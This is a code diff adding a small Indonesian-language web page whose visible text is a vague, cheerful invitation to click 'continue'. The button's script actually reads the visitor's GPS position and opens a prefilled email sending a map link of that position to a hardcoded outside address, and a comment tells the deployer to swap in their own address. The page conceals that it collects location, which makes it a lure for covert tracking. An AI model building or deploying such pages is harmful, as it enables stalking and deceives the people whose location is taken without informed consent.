@@ -1,0 +1,73 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8" />
+  <title>Kirim Lokasi Saya</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <style>
+    body{
+      font-family: Arial, sans-serif;
+      background:#0f172a;
+      color:#fff;
+      display:flex;
+      align-items:center;
+      justify-content:center;
+      height:100vh;
+      margin:0;
+    }
+    .box{
+      background:#020617;
+      padding:20px;
+      border-radius:14px;
+      max-width:360px;
+      text-align:center;
+      box-shadow:0 10px 30px rgba(0,0,0,.5);
+    }
+    button{
+      margin-top:15px;
+      padding:14px 18px;
+      font-size:16px;
+      border:none;
+      border-radius:10px;
+      cursor:pointer;
+    }
+    .note{
+      font-size:12px;
+      opacity:.8;
+      margin-top:10px;
+    }
+  </style>
+</head>
+<body>
+  <div class="box">
+    <h3>hidup sangat indah😍</h3>
+    <p>kita harus selalu bernyukur, <b>setelah kamu klik</b> dan menikmati setiap momen</p>
+    <button onclick="kirim()">LANJUTKAN</button>
+    <div class="note">klick dan nikmati🥰</div>
+  </div>
+
+<script>
+function kirim(){
+  if(!navigator.geolocation){
+    alert("GPS tidak didukung");
+    return;
+  }
+  navigator.geolocation.getCurrentPosition(pos=>{
+    const lat = pos.coords.latitude;
+    const lon = pos.coords.longitude;
+    const map = `https://www.google.com/maps?q=${lat},${lon}`;
+    const subject = "Lokasi Saya";
+    const body = `Ini lokasi saya:\n${map}\n\nWaktu: ${new Date().toLocaleString()}`;
+
+    // GANTI email tujuan di bawah ini
+    const to = "baloy01@gmail.com";
+
+    window.location.href =
+      `mailto:${to}?subject=${encodeURIComponent(subject)}&body=${encodeURIComponent(body)}`;
+  }, ()=>{
+    alert("");
+  });
+}
+</script>
+</body>
+</html>
